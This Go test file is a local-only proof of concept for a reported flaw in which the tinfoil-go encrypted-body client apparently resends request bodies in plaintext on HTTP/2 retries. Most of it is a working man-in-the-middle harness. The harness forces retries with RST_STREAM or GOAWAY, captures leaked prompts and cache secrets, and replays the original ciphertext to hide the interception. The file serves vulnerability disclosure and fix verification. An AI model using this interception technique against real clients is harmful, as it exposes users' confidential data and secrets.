package tinfoil_test

// Tightened PoC for "EHBP Go client leaks the plaintext request body on
// HTTP/2 transport-level retries". LOCAL ONLY (127.0.0.1).
//
// Exactly one thing differs from production: enclave.PoCAttestationStub
// replaces the attestation fetch+verify step and hands back the genuine (local)
// enclave's HPKE key, as a successful verification would. Everything else is
// the unmodified public-API path a user takes:
//
//	tinfoil.NewClientWithOptions / tinfoil.NewGateway
//	  -> enclave.Handle (real) -> Handle.NewTransport / clientTransport (real)
//	  -> recoveryTransport -> userCacheSecretTransport -> hostBoundTransport
//	  -> enclaveURLHeaderTransport -> EHBP v0.3.2 client.Transport
//	  -> http.DefaultTransport (NOT modified: no TLSClientConfig, no NextProtos)
//
// The attacker's certificate is trusted only via SSL_CERT_FILE (stand-in for a
// WebPKI certificate for the proxy / gateway / enclave hostname). The user
// cache secret is the SDK-generated default persisted under $HOME/.tinfoil.

import (
	"bytes"
	"context"
	"crypto/tls"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	ehbpidentity "github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	tinfoil "github.com/tinfoilsh/tinfoil-go"
	"github.com/tinfoilsh/tinfoil-go/document"
	"github.com/tinfoilsh/tinfoil-go/enclave"
	"github.com/tinfoilsh/tinfoil-go/verify"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// ---------------------------------------------------------------- enclave --

type genuineEnclave struct {
	id   *ehbpidentity.Identity
	srv  *httptest.Server
	mu   sync.Mutex
	seen []string // request bodies the enclave decrypted
}

func newGenuineEnclave(t *testing.T) *genuineEnclave {
	t.Helper()
	id, err := ehbpidentity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	e := &genuineEnclave{id: id}
	e.srv = httptest.NewServer(id.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		e.mu.Lock()
		e.seen = append(e.seen, string(b))
		e.mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		if strings.HasSuffix(r.URL.Path, "/embeddings") {
			io.WriteString(w, `{"object":"list","model":"m","data":[{"object":"embedding","index":0,"embedding":[0.25,0.5]}],"usage":{"prompt_tokens":3,"total_tokens":3}}`)
			return
		}
		io.WriteString(w, `{"id":"c1","object":"chat.completion","created":1,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"hello from the genuine enclave"}}]}`)
	})))
	t.Cleanup(e.srv.Close)
	return e
}

func (e *genuineEnclave) decrypted() []string {
	e.mu.Lock()
	defer e.mu.Unlock()
	return append([]string(nil), e.seen...)
}

// The only production deviation: attestation returns the genuine enclave key.
func stubAttestation(t *testing.T, e *genuineEnclave) {
	enclave.PoCAttestationStub = func(host string) (*verify.Verification, error) {
		return &verify.Verification{
			CryptoMaterial: []document.CryptoMaterialItem{
				{ID: document.CryptoMaterialIDTLS, Format: document.KeySPKIFPSHA256V1Format, Data: strings.Repeat("ab", 32)},
				{ID: document.CryptoMaterialIDHPKE, Format: document.KeyX25519HPKEV1Format, Data: e.id.MarshalPublicKeyHex()},
			},
			FreshnessExpiresAt: time.Now().Add(time.Hour),
		}, nil
	}
	t.Cleanup(func() { enclave.PoCAttestationStub = nil })
}

// --------------------------------------------------------------- attacker --

type capture struct {
	conn    int
	stream  uint32
	headers map[string]string
	body    bytes.Buffer
}

// attacker is a TLS-terminating HTTP/2 intermediary (configured proxy, the
// Tinfoil gateway, or anyone holding a certificate for the hostname). It keeps
// the first (encrypted) request, makes the client "retry" with a standard
// HTTP/2 signal, and then forwards the ORIGINAL ciphertext to the genuine
// enclave and relays the genuine encrypted answer.
type attacker struct {
	t        *testing.T
	trigger  string // "rst": RST_STREAM(REFUSED_STREAM); "goaway": GOAWAY(NO_ERROR, last=0)
	upstream string
	ln       net.Listener

	mu         sync.Mutex
	conns      int
	alpnOffers [][]string
	negotiated []string
	captures   []*capture
	first      *capture
}

func newAttacker(t *testing.T, trigger, upstream string) *attacker {
	t.Helper()
	cert, err := tls.LoadX509KeyPair(os.Getenv("POC_LEAF_CERT"), os.Getenv("POC_LEAF_KEY"))
	if err != nil {
		t.Fatalf("load attacker cert: %v", err)
	}
	a := &attacker{t: t, trigger: trigger, upstream: upstream}
	cfg := &tls.Config{
		Certificates: []tls.Certificate{cert},
		NextProtos:   []string{"h2", "http/1.1"},
		GetConfigForClient: func(h *tls.ClientHelloInfo) (*tls.Config, error) {
			a.mu.Lock()
			a.alpnOffers = append(a.alpnOffers, append([]string(nil), h.SupportedProtos...))
			a.mu.Unlock()
			return nil, nil
		},
	}
	ln, err := tls.Listen("tcp", "127.0.0.1:0", cfg)
	if err != nil {
		t.Fatal(err)
	}
	a.ln = ln
	t.Cleanup(func() { ln.Close() })
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go a.serve(c.(*tls.Conn))
		}
	}()
	return a
}

func (a *attacker) url() string { return "https://" + a.ln.Addr().String() }

func (a *attacker) serve(c *tls.Conn) {
	defer c.Close()
	if err := c.Handshake(); err != nil {
		return
	}
	proto := c.ConnectionState().NegotiatedProtocol
	a.mu.Lock()
	a.conns++
	connID := a.conns
	a.negotiated = append(a.negotiated, proto)
	a.mu.Unlock()
	if proto != "h2" {
		return
	}
	preface := make([]byte, len(http2.ClientPreface))
	if _, err := io.ReadFull(c, preface); err != nil || string(preface) != http2.ClientPreface {
		return
	}
	fr := http2.NewFramer(c, c)
	fr.ReadMetaHeaders = hpack.NewDecoder(4096, nil)
	fr.WriteSettings()
	var hbuf bytes.Buffer
	enc := hpack.NewEncoder(&hbuf)
	streams := map[uint32]*capture{}
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return
		}
		var done *capture
		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				fr.WriteSettingsAck()
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				fr.WritePing(true, f.Data)
			}
		case *http2.MetaHeadersFrame:
			cs := &capture{conn: connID, stream: f.StreamID, headers: map[string]string{}}
			for _, hf := range f.Fields {
				cs.headers[hf.Name] = hf.Value
			}
			streams[f.StreamID] = cs
			if f.StreamEnded() {
				done = cs
			}
		case *http2.DataFrame:
			cs := streams[f.StreamID]
			if cs == nil {
				continue
			}
			cs.body.Write(f.Data())
			if n := uint32(len(f.Data())); n > 0 {
				fr.WriteWindowUpdate(0, n)
				fr.WriteWindowUpdate(f.StreamID, n)
			}
			if f.StreamEnded() {
				done = cs
			}
		}
		if done == nil {
			continue
		}
		a.mu.Lock()
		a.captures = append(a.captures, done)
		isFirst := a.first == nil
		if isFirst {
			a.first = done
		}
		first := a.first
		a.mu.Unlock()
		if isFirst {
			if a.trigger == "goaway" {
				fr.WriteGoAway(0, http2.ErrCodeNo, nil)
			} else {
				fr.WriteRSTStream(done.stream, http2.ErrCodeRefusedStream)
			}
			continue
		}
		status, hdr, body, err := a.forward(first)
		if err != nil {
			a.t.Errorf("attacker forward: %v", err)
			return
		}
		hbuf.Reset()
		enc.WriteField(hpack.HeaderField{Name: ":status", Value: strconv.Itoa(status)})
		for _, k := range []string{"Content-Type", "Ehbp-Response-Nonce"} {
			if v := hdr.Get(k); v != "" {
				enc.WriteField(hpack.HeaderField{Name: strings.ToLower(k), Value: v})
			}
		}
		fr.WriteHeaders(http2.HeadersFrameParam{StreamID: done.stream, BlockFragment: hbuf.Bytes(), EndHeaders: true, EndStream: len(body) == 0})
		for len(body) > 0 {
			n := min(len(body), 16384)
			fr.WriteData(done.stream, n == len(body), body[:n])
			body = body[n:]
		}
	}
}

// forward sends the captured ORIGINAL ciphertext (with its encapsulated key)
// to the genuine enclave, exactly as an honest proxy would have.
func (a *attacker) forward(first *capture) (int, http.Header, []byte, error) {
	req, err := http.NewRequest(http.MethodPost, a.upstream+first.headers[":path"], bytes.NewReader(first.body.Bytes()))
	if err != nil {
		return 0, nil, nil, err
	}
	req.Header.Set("Ehbp-Encapsulated-Key", first.headers["ehbp-encapsulated-key"])
	req.Header.Set("Content-Type", first.headers["content-type"])
	resp, err := (&http.Client{Transport: &http.Transport{}}).Do(req)
	if err != nil {
		return 0, nil, nil, err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(resp.Body)
	return resp.StatusCode, resp.Header, b, err
}

func (a *attacker) snapshot() ([]*capture, [][]string, []string) {
	a.mu.Lock()
	defer a.mu.Unlock()
	return append([]*capture(nil), a.captures...), append([][]string(nil), a.alpnOffers...), append([]string(nil), a.negotiated...)
}

// ----------------------------------------------------------------- checks --

func requireLocalSetup(t *testing.T) {
	t.Helper()
	if os.Getenv("SSL_CERT_FILE") == "" || os.Getenv("POC_LEAF_CERT") == "" {
		t.Skip("run with SSL_CERT_FILE, POC_LEAF_CERT, POC_LEAF_KEY (see report)")
	}
	if v, ok := os.LookupEnv("TINFOIL_USER_CACHE_SECRET"); ok && v != "" {
		t.Fatal("unset TINFOIL_USER_CACHE_SECRET: the PoC uses the SDK-generated default")
	}
	// The client stack under test must use the stock DefaultTransport: no
	// custom roots, no InsecureSkipVerify (net/http itself fills NextProtos).
	if cfg := http.DefaultTransport.(*http.Transport).TLSClientConfig; cfg != nil && (cfg.RootCAs != nil || cfg.InsecureSkipVerify) {
		t.Fatal("http.DefaultTransport was modified")
	}
}

func persistedSecret(t *testing.T) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(os.Getenv("HOME"), ".tinfoil", "user_cache_secret"))
	if err != nil {
		t.Fatalf("SDK-generated user cache secret not found: %v", err)
	}
	return strings.TrimSpace(string(b))
}

func short(s string, n int) string {
	if len(s) > n {
		return s[:n] + "..."
	}
	return s
}

// evaluate logs the evidence and returns the plaintext body the attacker
// read (empty if none).
func evaluate(t *testing.T, atk *attacker, enc *genuineEnclave, marker string) string {
	t.Helper()
	caps, offers, negotiated := atk.snapshot()
	t.Logf("client ALPN offers seen by attacker: %v; negotiated: %v", offers, negotiated)
	for i, c := range caps {
		key := c.headers["ehbp-encapsulated-key"]
		t.Logf("attacker capture %d [conn %d stream %d] %s %s ehbp-encapsulated-key=%s x-stainless-retry-count=%s x-tinfoil-enclave-url=%q body(%dB)=%q",
			i, c.conn, c.stream, c.headers[":method"], c.headers[":path"], short(key, 16), c.headers["x-stainless-retry-count"],
			c.headers["x-tinfoil-enclave-url"], c.body.Len(), short(c.body.String(), 150))
	}
	t.Logf("genuine enclave decrypted %d request(s): %q", len(enc.decrypted()), enc.decrypted())
	if len(caps) == 0 {
		t.Fatal("attacker saw no requests")
	}
	if strings.Contains(caps[0].body.String(), marker) {
		t.Fatal("first attempt was not encrypted?")
	}
	for _, c := range caps[1:] {
		if strings.Contains(c.body.String(), marker) {
			if c.headers["ehbp-encapsulated-key"] != caps[0].headers["ehbp-encapsulated-key"] {
				t.Errorf("plaintext retry carried a different encapsulated key")
			}
			if c.headers["x-stainless-retry-count"] != caps[0].headers["x-stainless-retry-count"] {
				t.Errorf("retry-count differs: this would be an SDK-level retry, not a transport retry")
			}
			if seen := enc.decrypted(); len(seen) != 1 || seen[0] != c.body.String() {
				t.Errorf("leaked plaintext != body the enclave decrypted")
			}
			return c.body.String()
		}
	}
	return ""
}

func expectFixed() bool { return os.Getenv("POC_EXPECT") == "fixed" }

func verdict(t *testing.T, leaked string, callErr error) {
	t.Helper()
	switch {
	case expectFixed():
		if leaked != "" {
			t.Fatalf("patched EHBP still leaked plaintext")
		}
		t.Logf("NOT VULNERABLE (patched EHBP): attacker saw only ciphertext; SDK call error = %v", callErr)
	default:
		if leaked == "" {
			t.Fatalf("no plaintext reached the attacker (call err = %v)", callErr)
		}
		if callErr != nil {
			t.Fatalf("expected a normal successful SDK call, got %v", callErr)
		}
		t.Logf("VULNERABLE: attacker read the plaintext body; the SDK call returned success")
	}
}

// ------------------------------------------------------------------ tests --

const promptMarker = "Jane Roe, HIV positive, DOB 1980-02-03"

// Scenario 1: documented proxy deployment (WithBaseURL), default EHBP mode,
// SDK-generated user_cache_secret; trigger RST_STREAM(REFUSED_STREAM).
func TestTight1_WithBaseURLProxy_RSTStream_Chat(t *testing.T) {
	requireLocalSetup(t)
	enc := newGenuineEnclave(t)
	stubAttestation(t, enc)
	atk := newAttacker(t, "rst", enc.srv.URL)

	client, err := tinfoil.NewClientWithOptions(
		tinfoil.WithEnclave("enclave.example"),
		tinfoil.WithBaseURL(atk.url()+"/v1/"),
		tinfoil.WithOpenAIOptions(option.WithAPIKey("tk_test")),
	)
	if err != nil {
		t.Fatal(err)
	}
	if client.Transport() != tinfoil.TransportEHBP {
		t.Fatalf("transport = %s", client.Transport())
	}
	secret := persistedSecret(t)

	resp, callErr := client.Chat.Completions.New(context.Background(), openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("TOP-SECRET: patient " + promptMarker)},
	})
	if callErr == nil {
		t.Logf("SDK call returned: %q", resp.Choices[0].Message.Content)
	}
	leaked := evaluate(t, atk, enc, promptMarker)
	if leaked != "" && !strings.Contains(leaked, `"user_cache_secret":"`+secret+`"`) {
		t.Errorf("expected the SDK-generated user_cache_secret (%s...) in the leaked body", secret[:8])
	}
	if leaked != "" {
		t.Logf("leaked SDK-generated user_cache_secret from $HOME/.tinfoil: %s...", secret[:12])
	}
	verdict(t, leaked, callErr)
}

// Scenario 2: no proxy at all (default direct EHBP path; TLS is not pinned in
// EHBP mode), an on-path party holding a certificate for the enclave host.
// Endpoint /embeddings: tinfoil-go does not inject the cache secret here, so
// GetBody comes from openai-go alone. Trigger: GOAWAY(NO_ERROR).
func TestTight2_DirectEnclave_GOAWAY_Embeddings(t *testing.T) {
	requireLocalSetup(t)
	enc := newGenuineEnclave(t)
	stubAttestation(t, enc)
	atk := newAttacker(t, "goaway", enc.srv.URL)

	client, err := tinfoil.NewClientWithOptions(
		tinfoil.WithEnclave(strings.TrimPrefix(atk.url(), "https://")),
		tinfoil.WithOpenAIOptions(option.WithAPIKey("tk_test")),
	)
	if err != nil {
		t.Fatal(err)
	}
	emb, callErr := client.Embeddings.New(context.Background(), openai.EmbeddingNewParams{
		Model: "m",
		Input: openai.EmbeddingNewParamsInputUnion{OfString: openai.String("index this: " + promptMarker)},
	})
	if callErr == nil {
		t.Logf("SDK call returned embedding %v", emb.Data[0].Embedding)
	}
	leaked := evaluate(t, atk, enc, promptMarker)
	verdict(t, leaked, callErr)
}

// Scenario 3: tinfoil.NewGateway (what tinfoil-proxy uses); the gateway is the
// TLS endpoint. Trigger RST_STREAM(REFUSED_STREAM).
func TestTight3_Gateway_RSTStream_Chat(t *testing.T) {
	requireLocalSetup(t)
	enc := newGenuineEnclave(t)
	stubAttestation(t, enc)
	atk := newAttacker(t, "rst", enc.srv.URL)

	gw, err := tinfoil.NewGateway(atk.url()+"/v1/", func() tinfoil.Catalog {
		return tinfoil.Catalog{"m": {Repo: "tinfoilsh/confidential-model-x", Hosts: []string{"replica.example"}}}
	}, tinfoil.GatewayOptions{ClientOptions: []tinfoil.ClientOption{tinfoil.WithOpenAIOptions(option.WithAPIKey("tk_test"))}})
	if err != nil {
		t.Fatal(err)
	}
	resp, callErr := gw.Chat.Completions.New(context.Background(), openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("TOP-SECRET via gateway: " + promptMarker)},
	})
	if callErr == nil {
		t.Logf("SDK call returned: %q", resp.Choices[0].Message.Content)
	}
	leaked := evaluate(t, atk, enc, promptMarker)
	if leaked != "" && !strings.Contains(leaked, `"cache_salt":"`) {
		t.Errorf("expected cache_salt in the leaked gateway body")
	}
	verdict(t, leaked, callErr)
}
